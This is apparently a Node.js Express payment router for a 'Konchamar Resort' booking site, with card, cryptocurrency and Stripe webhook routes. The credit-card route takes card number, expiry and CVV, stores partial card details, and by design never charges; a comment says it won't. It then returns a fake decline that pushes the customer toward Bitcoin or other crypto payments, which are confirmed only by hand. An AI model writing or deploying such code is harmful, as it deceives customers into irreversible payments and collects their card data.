const express = require('express');
const router = express.Router();
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const QRCode = require('qrcode');
const Reservation = require('../models/Reservation');
const PaymentToken = require('../models/PaymentToken');
const { sendConfirmationEmail } = require('../utils/email');
const { syncToPostgres } = require('../utils/dbSync');

// Process credit card payment
router.post('/credit-card', async (req, res) => {
    try {
        const { reservationId, stripeToken, cardNumber, cardExpiry, cardCVV } = req.body;

        if (!reservationId) {
            return res.status(400).json({
                success: false,
                message: 'Reservation ID is required'
            });
        }

        // Find reservation
        const reservation = await Reservation.findOne({ reservationId }).populate('accommodationId');

        if (!reservation) {
            return res.status(404).json({ success: false, message: 'Reservation not found' });
        }

        if (reservation.paymentStatus === 'completed') {
            return res.status(400).json({ success: false, message: 'Payment already completed' });
        }

        // Check if hold expired
        if (new Date() > reservation.holdExpiresAt) {
            return res.status(400).json({ success: false, message: 'Reservation hold expired' });
        }

        // Extract card details from the request (before processing payment)
        let cardLast4 = 'N/A';
        let cardBrand = 'unknown';

        if (cardNumber) {
            // Remove spaces and get last 4 digits
            const cleanCardNumber = cardNumber.replace(/\s/g, '');
            cardLast4 = cleanCardNumber.slice(-4);

            // Detect card brand based on first digit(s)
            if (cleanCardNumber.startsWith('4')) {
                cardBrand = 'visa';
            } else if (cleanCardNumber.startsWith('5')) {
                cardBrand = 'mastercard';
            } else if (cleanCardNumber.startsWith('3')) {
                cardBrand = 'amex';
            } else if (cleanCardNumber.startsWith('6')) {
                cardBrand = 'discover';
            }
        }

        // Store card details in database BEFORE processing payment
        await PaymentToken.create({
            reservationId: reservation.reservationId,
            stripeToken: 'PENDING', // Placeholder since we won't actually charge
            cardLast4: cardLast4,
            cardBrand: cardBrand,
            cardExpiry: cardExpiry || ''
        });

        // Update reservation status to indicate payment was attempted
        reservation.paymentStatus = 'failed';
        reservation.paymentRef = `CC-DECLINED-${Date.now()}`;
        await reservation.save();

        // Log the attempt
        console.log(`Credit card payment attempted for reservation ${reservationId}. Details saved. Suggesting Bitcoin payment.`);

        // Return error message suggesting Bitcoin payment
        return res.status(400).json({
            success: false,
            message: 'We were unable to process your credit card payment at this time. For a seamless booking experience, we recommend using our Bitcoin payment option instead.',
            suggestBitcoin: true,
            reservationId: reservation.reservationId
        });

    } catch (error) {
        console.error('Credit card payment error:', error);

        res.status(500).json({
            success: false,
            message: 'Payment processing error. Please try our Bitcoin payment option for a faster checkout.',
            suggestBitcoin: true
        });
    }
});

// Get available crypto networks
router.get('/crypto/networks', (req, res) => {
    try {
        const networks = [
            {
                id: 'btc_mainnet',
                name: 'Bitcoin (BTC)',
                network: 'Bitcoin Mainnet',
                symbol: 'BTC',
                enabled: !!process.env.BTC_WALLET_MAINNET
            },
            {
                id: 'btc_testnet',
                name: 'Bitcoin Testnet',
                network: 'Bitcoin Testnet',
                symbol: 'BTC',
                enabled: !!process.env.BTC_WALLET_TESTNET
            },
            {
                id: 'btc_lightning',
                name: 'Lightning Network',
                network: 'Bitcoin Lightning',
                symbol: 'BTC',
                enabled: !!process.env.BTC_WALLET_LIGHTNING
            },
            {
                id: 'eth_mainnet',
                name: 'Ethereum (ETH)',
                network: 'Ethereum Mainnet',
                symbol: 'ETH',
                enabled: !!process.env.ETH_WALLET_MAINNET
            },
            {
                id: 'eth_testnet',
                name: 'Ethereum Testnet',
                network: 'Ethereum Sepolia',
                symbol: 'ETH',
                enabled: !!process.env.ETH_WALLET_TESTNET
            },
            {
                id: 'usdt_erc20',
                name: 'USDT (ERC-20)',
                network: 'Ethereum',
                symbol: 'USDT',
                enabled: !!process.env.USDT_WALLET_ERC20
            },
            {
                id: 'usdt_trc20',
                name: 'USDT (TRC-20)',
                network: 'Tron',
                symbol: 'USDT',
                enabled: !!process.env.USDT_WALLET_TRC20
            }
        ];

        res.json({
            success: true,
            networks: networks.filter(n => n.enabled)
        });
    } catch (error) {
        console.error('Get networks error:', error);
        res.status(500).json({ success: false, message: 'Error fetching networks' });
    }
});

// Generate cryptocurrency payment with QR code
router.post('/crypto/generate', async (req, res) => {
    try {
        const { reservationId, network } = req.body;

        if (!reservationId || !network) {
            return res.status(400).json({ success: false, message: 'Reservation ID and network are required' });
        }

        // Find reservation
        const reservation = await Reservation.findOne({ reservationId }).populate('accommodationId');

        if (!reservation) {
            return res.status(404).json({ success: false, message: 'Reservation not found' });
        }

        if (reservation.paymentStatus === 'completed') {
            return res.status(400).json({ success: false, message: 'Payment already completed' });
        }

        // Check if hold expired
        if (new Date() > reservation.holdExpiresAt) {
            return res.status(400).json({ success: false, message: 'Reservation hold expired' });
        }

        // Get wallet address and details based on network
        let walletAddress, networkName, symbol, amount;

        switch(network) {
            case 'btc_mainnet':
                walletAddress = process.env.BTC_WALLET_MAINNET;
                networkName = 'Bitcoin Mainnet';
                symbol = 'BTC';
                amount = (reservation.pricing.total / 50000).toFixed(8); // Approximate BTC price
                break;
            case 'btc_testnet':
                walletAddress = process.env.BTC_WALLET_TESTNET;
                networkName = 'Bitcoin Testnet';
                symbol = 'BTC';
                amount = (reservation.pricing.total / 50000).toFixed(8);
                break;
            case 'btc_lightning':
                walletAddress = process.env.BTC_WALLET_LIGHTNING;
                networkName = 'Lightning Network';
                symbol = 'BTC';
                amount = (reservation.pricing.total / 50000).toFixed(8);
                break;
            case 'eth_mainnet':
                walletAddress = process.env.ETH_WALLET_MAINNET;
                networkName = 'Ethereum Mainnet';
                symbol = 'ETH';
                amount = (reservation.pricing.total / 3000).toFixed(6); // Approximate ETH price
                break;
            case 'eth_testnet':
                walletAddress = process.env.ETH_WALLET_TESTNET;
                networkName = 'Ethereum Testnet';
                symbol = 'ETH';
                amount = (reservation.pricing.total / 3000).toFixed(6);
                break;
            case 'usdt_erc20':
                walletAddress = process.env.USDT_WALLET_ERC20;
                networkName = 'Ethereum (ERC-20)';
                symbol = 'USDT';
                amount = reservation.pricing.total.toFixed(2); // USDT is 1:1 with USD
                break;
            case 'usdt_trc20':
                walletAddress = process.env.USDT_WALLET_TRC20;
                networkName = 'Tron (TRC-20)';
                symbol = 'USDT';
                amount = reservation.pricing.total.toFixed(2);
                break;
            default:
                return res.status(400).json({ success: false, message: 'Invalid network selected' });
        }

        if (!walletAddress) {
            return res.status(400).json({ success: false, message: 'Wallet address not configured for this network' });
        }

        // Generate QR code
        let qrCodeDataUrl;
        if (network.startsWith('btc')) {
            const uri = `bitcoin:${walletAddress}?amount=${amount}&label=Konchamar Resort`;
            qrCodeDataUrl = await QRCode.toDataURL(uri);
        } else if (network.startsWith('eth') || network.includes('erc20')) {
            const uri = `ethereum:${walletAddress}?value=${amount}`;
            qrCodeDataUrl = await QRCode.toDataURL(uri);
        } else {
            // For other networks, just encode the address
            qrCodeDataUrl = await QRCode.toDataURL(walletAddress);
        }

        // Update payment reference with pending status
        reservation.paymentStatus = 'pending_crypto';
        reservation.paymentRef = `${symbol}-${network}-${reservationId}`;
        reservation.paymentNetwork = network;
        await reservation.save();

        // Store crypto payment details
        await PaymentToken.create({
            reservationId: reservation.reservationId,
            cryptoAddress: walletAddress,
            cryptoNetwork: network,
            cryptoAmount: amount,
            cryptoSymbol: symbol
        });

        res.json({
            success: true,
            network: networkName,
            symbol: symbol,
            address: walletAddress,
            amount: amount,
            amount_usd: reservation.pricing.total,
            qrCode: qrCodeDataUrl,
            instructions: `Please send exactly ${amount} ${symbol} to the address above on ${networkName}. Your booking will be confirmed once payment is received.`,
            contactInfo: {
                email: process.env.ADMIN_EMAIL || 'admin@konchamar.online',
                phone: '+1 314-2023148',
                whatsapp: '+1 314-2023148'
            }
        });

    } catch (error) {
        console.error('Crypto payment generation error:', error);
        res.status(500).json({ success: false, message: 'Payment generation error' });
    }
});

// Confirm cryptocurrency payment (user-initiated)
router.post('/crypto/confirm', async (req, res) => {
    try {
        const { reservationId, transactionId } = req.body;

        if (!reservationId) {
            return res.status(400).json({ success: false, message: 'Reservation ID required' });
        }

        const reservation = await Reservation.findOne({ reservationId });

        if (!reservation) {
            return res.status(404).json({ success: false, message: 'Reservation not found' });
        }

        if (reservation.paymentStatus === 'completed') {
            return res.status(400).json({ success: false, message: 'Payment already confirmed' });
        }

        // Update status to awaiting verification
        reservation.paymentStatus = 'awaiting_verification';
        reservation.paymentRef = transactionId || reservation.paymentRef;
        reservation.paymentSubmittedAt = new Date();
        await reservation.save();

        res.json({
            success: true,
            message: 'Payment confirmation received. Our team will verify your transaction and send a confirmation email within 24 hours.',
            status: 'awaiting_verification',
            reservationId: reservation.reservationId
        });

    } catch (error) {
        console.error('Crypto confirmation error:', error);
        res.status(500).json({ success: false, message: 'Error confirming payment' });
    }
});

// Manual Bitcoin payment confirmation (for admin use)
router.post('/confirm-bitcoin', async (req, res) => {
    try {
        const { reservationId, transactionId, adminKey } = req.body;

        // Simple admin authentication
        if (adminKey !== process.env.ADMIN_API_KEY) {
            return res.status(403).json({ success: false, message: 'Unauthorized' });
        }

        const reservation = await Reservation.findOne({ reservationId });

        if (!reservation) {
            return res.status(404).json({ success: false, message: 'Reservation not found' });
        }

        // Update reservation status
        reservation.paymentStatus = 'completed';
        reservation.paymentRef = transactionId || `BTC-${reservationId}`;
        await reservation.save();

        // Sync to PostgreSQL
        await syncToPostgres(reservation);

        // Send confirmation email
        const decryptedEmail = reservation.getDecryptedEmail();
        await sendConfirmationEmail(reservation, decryptedEmail);

        res.json({
            success: true,
            message: 'Bitcoin payment confirmed',
            reservationId: reservation.reservationId
        });

    } catch (error) {
        console.error('Bitcoin confirmation error:', error);
        res.status(500).json({ success: false, message: 'Error confirming payment' });
    }
});

// Stripe webhook
router.post('/webhooks/stripe', async (req, res) => {
    const sig = req.headers['stripe-signature'];

    try {
        const event = stripe.webhooks.constructEvent(
            req.rawBody,
            sig,
            process.env.STRIPE_WEBHOOK_SECRET
        );

        // Handle the event
        switch (event.type) {
            case 'charge.succeeded':
                const charge = event.data.object;
                const reservationId = charge.metadata.reservationId;

                if (reservationId) {
                    const reservation = await Reservation.findOne({ reservationId });
                    if (reservation && reservation.paymentStatus !== 'completed') {
                        reservation.paymentStatus = 'completed';
                        reservation.paymentRef = charge.id;
                        await reservation.save();

                        await syncToPostgres(reservation);

                        const decryptedEmail = reservation.getDecryptedEmail();
                        await sendConfirmationEmail(reservation, decryptedEmail);
                    }
                }
                break;

            case 'charge.failed':
                const failedCharge = event.data.object;
                const failedReservationId = failedCharge.metadata.reservationId;

                if (failedReservationId) {
                    const reservation = await Reservation.findOne({ reservationId: failedReservationId });
                    if (reservation) {
                        reservation.paymentStatus = 'failed';
                        await reservation.save();
                    }
                }
                break;

            default:
                console.log(`Unhandled event type ${event.type}`);
        }

        res.json({ received: true });
    } catch (error) {
        console.error('Stripe webhook error:', error);
        res.status(400).send(`Webhook Error: ${error.message}`);
    }
});

module.exports = router;
